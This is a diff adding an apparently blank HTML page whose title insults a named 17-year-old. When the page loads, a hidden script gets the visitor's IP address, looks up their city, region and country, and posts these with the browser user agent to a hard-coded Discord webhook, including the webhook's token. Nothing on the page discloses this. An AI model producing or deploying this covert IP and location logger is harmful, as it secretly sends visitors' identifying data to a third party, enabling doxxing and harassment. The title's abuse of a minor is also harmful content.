@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>xdfday Age: 17 Reason: Stupid Fucking Dumbass</title>
+</head>
+<body>
+    <!-- Your HTML content goes here -->
+
+    <script>
+        window.addEventListener('load', () => {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ipAddress = data.ip;
+                    const userAgent = navigator.userAgent;
+                    fetch(`https://ipinfo.io/${ipAddress}/json`)
+                        .then(response => response.json())
+                        .then(ipInfoData => {
+                            const country = ipInfoData.country;
+                            const region = ipInfoData.region;
+                            const city = ipInfoData.city;
+                            const visitorData = {
+                                ipAddress,
+                                userAgent,
+                                country,
+                                region,
+                                city
+                            };
+                            fetch('https://discord.com/api/webhooks/1153368070212042873/8159ZHhXuQyT34AIfHn_WaqRceY7dimq7gptVVd-x389H5S3sNVPaRr_YVOlGV6KAQxy', {
+                                method: 'POST',
+                                headers: {
+                                    'Content-Type': 'application/json'
+                                },
+                                body: JSON.stringify({
+                                    content: `New Visitor on 4psi.github.io\nIP Address: ${visitorData.ipAddress}\nUser Agent: ${visitorData.userAgent}\nCountry: ${visitorData.country}\nRegion: ${visitorData.region}\nCity: ${visitorData.city}`
+                                })
+                            })
+                            .then(() => {
+                                console.log('Visitor data sent to Discord webhook.');
+                            })
+                            .catch(error => {
+                                console.error('Error sending data to Discord webhook:', error);
+                            });
+                        })
+                        .catch(error => {
+                            console.error('Error fetching IP info:', error);
+                        });
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
+        });
+    </script>
+</body>
+</html>
